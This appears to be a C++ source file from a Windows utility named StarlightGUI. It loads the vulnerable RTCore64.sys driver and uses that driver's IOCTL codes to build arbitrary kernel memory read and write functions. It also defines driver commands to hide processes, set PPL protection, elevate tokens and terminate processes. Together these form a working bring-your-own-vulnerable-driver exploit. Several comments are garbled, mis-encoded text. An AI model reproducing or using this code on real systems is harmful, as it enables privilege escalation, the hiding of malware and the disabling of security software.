#include "pch.h"
#include "KernelBase.h"
#include "winioctl.h"

#define IOCTL_OFFSET_Protection           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OFFSET_UniqueProcessId      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OFFSET_ApcQueueable         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OFFSET_ActiveProcessLinks   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_HideProcess				  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)        // À¶ÆÁ¾¯¸æ
#define IOCTL_SetPID4					  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)        // ¸ÅÂÊÀ¶ÆÁ¾¯¸æ
#define IOCTL_SetPPL                      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TokenUp                     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SetCritical                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ApcQueueable                CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)       // À¶ÆÁ¾¯¸æ
#define IOCTL_DisableProcCreate           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_EnableProcCreate            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TerminateProcess            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)

namespace winrt::StarlightGUI::implementation {

	static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
	static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
	static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

	BOOL KernelInstance::ZwTerminateProcess0(DWORD pid) {
		if (pid == 0) return FALSE;
		if (!DriverUtils::LoadKernelDriver(kernelPath.c_str(), unused)) return FALSE;

		DWORD bytesReturned;

		HANDLE device = CreateFile(L"\\\\.\\Drv", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

		if (device == INVALID_HANDLE_VALUE) return FALSE;

		return DeviceIoControl(device, IOCTL_TerminateProcess, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);
	}

	DWORD KernelInstance::ReadMemoryPrimitive(DWORD Size, DWORD64 Address) {
		struct RTCORE64_MEMORY_READ {
			BYTE Pad0[8];
			DWORD64 Address;
			BYTE Pad1[8];
			DWORD ReadSize;
			DWORD Value;
			BYTE Pad3[16];
		};

		if (!DriverUtils::LoadDriver(rtcorePath.c_str(), L"RTCore64.sys", unused)) return 0;

		HANDLE device = CreateFile(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

		if (device == INVALID_HANDLE_VALUE) {
			return 0;
		}

		RTCORE64_MEMORY_READ MemoryRead{};
		MemoryRead.Address = Address;
		MemoryRead.ReadSize = Size;

		DWORD BytesReturned;

		DeviceIoControl(device, RTCORE64_MEMORY_READ_CODE, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead), &BytesReturned, nullptr);

		return MemoryRead.Value;
	}

	void KernelInstance::WriteMemoryPrimitive(DWORD Size, DWORD64 Address, DWORD Value) {
		struct RTCORE64_MEMORY_WRITE {
			BYTE Pad0[8];
			DWORD64 Address;
			BYTE Pad1[8];
			DWORD WriteSize;
			DWORD Value;
			BYTE Pad3[16];
		};

		if (!DriverUtils::LoadDriver(rtcorePath.c_str(), L"RTCore64.sys", unused)) {
			OutputDebugString(unused.c_str());
			return;
		}

		HANDLE device = CreateFile(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

		if (device == INVALID_HANDLE_VALUE) return;

		RTCORE64_MEMORY_WRITE MemoryWrite{};
		MemoryWrite.Address = Address;
		MemoryWrite.WriteSize = Size;
		MemoryWrite.Value = Value;

		DWORD BytesReturned;

		DeviceIoControl(device, RTCORE64_MEMORY_WRITE_CODE, &MemoryWrite, sizeof(MemoryWrite), &MemoryWrite, sizeof(MemoryWrite), &BytesReturned, nullptr);
	}

	WORD KernelInstance::ReadMemoryWORD(DWORD64 Address) {
		return ReadMemoryPrimitive(2, Address) & 0xffff;
	}

	DWORD KernelInstance::ReadMemoryDWORD(DWORD64 Address) {
		return ReadMemoryPrimitive(4, Address);
	}

	DWORD64 KernelInstance::ReadMemoryDWORD64(DWORD64 Address) {
		return (static_cast<DWORD64>(ReadMemoryDWORD(Address + 4)) << 32) | ReadMemoryDWORD(Address);
	}

	void KernelInstance::WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value) {
		WriteMemoryPrimitive(4, Address, Value & 0xffffffff);
		WriteMemoryPrimitive(4, Address + 4, Value >> 32);
	}
}